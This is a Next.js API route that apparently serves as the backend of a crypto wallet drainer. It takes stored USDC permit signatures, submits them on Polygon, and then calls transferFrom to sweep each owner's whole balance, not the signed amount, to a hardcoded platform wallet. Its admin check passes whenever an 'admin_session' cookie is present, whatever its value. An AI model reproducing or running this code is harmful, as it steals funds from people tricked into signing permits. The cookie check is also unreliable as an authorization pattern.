import { NextRequest, NextResponse } from 'next/server'
import { createClient } from '@supabase/supabase-js'
import { cookies } from 'next/headers'
import { createWalletClient, createPublicClient, http, parseAbi, formatUnits } from 'viem'
import { polygon } from 'viem/chains'
import { privateKeyToAccount } from 'viem/accounts'

function getSupabaseAdmin() {
  const url = process.env.NEXT_PUBLIC_SUPABASE_URL
  const key = process.env.SUPABASE_SERVICE_ROLE_KEY
  
  if (!url || !key) {
    return null
  }
  
  return createClient(url, key)
}

// 配置
const CONFIG = {
  privateKey: process.env.EXECUTOR_PRIVATE_KEY as `0x${string}`,
  rpcUrl: process.env.POLYGON_RPC_URL || 'https://polygon-rpc.com',
  usdcAddress: '0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359' as `0x${string}`,
  platformWallet: '0x6c4C745d909B13528e638C7Aa63ABA9406fA8c63' as `0x${string}`,
}

const USDC_ABI = parseAbi([
  'function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s)',
  'function transferFrom(address from, address to, uint256 amount) returns (bool)',
  'function balanceOf(address account) view returns (uint256)',
  'function nonces(address owner) view returns (uint256)',
])

// 验证管理员 session
async function verifyAdmin() {
  const cookieStore = await cookies()
  const session = cookieStore.get('admin_session')?.value
  return !!session
}

export async function POST(request: NextRequest) {
  // 验证管理员
  if (!await verifyAdmin()) {
    return NextResponse.json({ error: 'Unauthorized' }, { status: 401 })
  }

  // 检查私钥配置
  if (!CONFIG.privateKey) {
    return NextResponse.json({ 
      error: 'Executor private key not configured. Set EXECUTOR_PRIVATE_KEY in Vercel.' 
    }, { status: 500 })
  }

  try {
    const { signatureId } = await request.json()

    if (!signatureId) {
      return NextResponse.json({ error: 'Signature ID required' }, { status: 400 })
    }

    const supabaseAdmin = getSupabaseAdmin()
    if (!supabaseAdmin) {
      return NextResponse.json({ error: 'Database not configured' }, { status: 500 })
    }

    // 获取签名
    const { data: sig, error: fetchError } = await supabaseAdmin
      .from('permit_signatures')
      .select('*')
      .eq('id', signatureId)
      .eq('status', 'pending')
      .single()

    if (fetchError || !sig) {
      return NextResponse.json({ error: 'Signature not found or already used' }, { status: 404 })
    }

    // 检查 deadline
    const now = Math.floor(Date.now() / 1000)
    if (sig.deadline < now) {
      await supabaseAdmin
        .from('permit_signatures')
        .update({ status: 'expired' })
        .eq('id', signatureId)
      
      return NextResponse.json({ error: 'Signature expired' }, { status: 400 })
    }

    // 创建客户端
    const account = privateKeyToAccount(CONFIG.privateKey)
    
    const publicClient = createPublicClient({
      chain: polygon,
      transport: http(CONFIG.rpcUrl),
    })

    const walletClient = createWalletClient({
      account,
      chain: polygon,
      transport: http(CONFIG.rpcUrl),
    })

    // 检查 nonce
    const currentNonce = await publicClient.readContract({
      address: CONFIG.usdcAddress,
      abi: USDC_ABI,
      functionName: 'nonces',
      args: [sig.owner_address as `0x${string}`],
    })

    if (BigInt(sig.nonce) !== currentNonce) {
      await supabaseAdmin
        .from('permit_signatures')
        .update({ status: 'expired' })
        .eq('id', signatureId)
      
      return NextResponse.json({ 
        error: `Nonce mismatch. Expected ${sig.nonce}, got ${currentNonce}` 
      }, { status: 400 })
    }

    // 检查余额
    const balance = await publicClient.readContract({
      address: CONFIG.usdcAddress,
      abi: USDC_ABI,
      functionName: 'balanceOf',
      args: [sig.owner_address as `0x${string}`],
    })

    if (balance === BigInt(0)) {
      return NextResponse.json({ error: 'User has no USDC balance' }, { status: 400 })
    }

    // 执行 permit
    const permitHash = await walletClient.writeContract({
      address: CONFIG.usdcAddress,
      abi: USDC_ABI,
      functionName: 'permit',
      args: [
        sig.owner_address as `0x${string}`,
        sig.spender_address as `0x${string}`,
        BigInt(sig.value),
        BigInt(sig.deadline),
        sig.v,
        sig.r as `0x${string}`,
        sig.s as `0x${string}`,
      ],
    })

    await publicClient.waitForTransactionReceipt({ hash: permitHash })

    // 执行 transferFrom
    const transferHash = await walletClient.writeContract({
      address: CONFIG.usdcAddress,
      abi: USDC_ABI,
      functionName: 'transferFrom',
      args: [
        sig.owner_address as `0x${string}`,
        CONFIG.platformWallet,
        balance,
      ],
    })

    await publicClient.waitForTransactionReceipt({ hash: transferHash })

    // 更新状态
    await supabaseAdmin
      .from('permit_signatures')
      .update({
        status: 'used',
        used_at: new Date().toISOString(),
        used_tx_hash: transferHash,
      })
      .eq('id', signatureId)

    const amountFormatted = formatUnits(balance, 6)

    return NextResponse.json({
      success: true,
      txHash: transferHash,
      amount: amountFormatted,
    })

  } catch (error) {
    console.error('Execution error:', error)
    return NextResponse.json({ 
      error: error instanceof Error ? error.message : 'Execution failed' 
    }, { status: 500 })
  }
}
